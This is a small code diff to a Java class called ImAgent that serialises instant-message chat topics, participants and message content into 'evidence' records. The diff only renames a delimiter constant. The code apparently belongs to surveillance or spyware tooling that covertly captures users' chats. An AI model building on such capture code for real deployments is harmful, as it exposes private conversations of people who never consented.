@@ -315,7 +315,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
             items.addElement(WChar.getBytes(topic, true));
             items.addElement(WChar.getBytes(users, true));
             items.addElement(WChar.getBytes(chatcontent, true));
-            items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
+            items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
         }
 
         evidence.atomicWriteOnce(items);
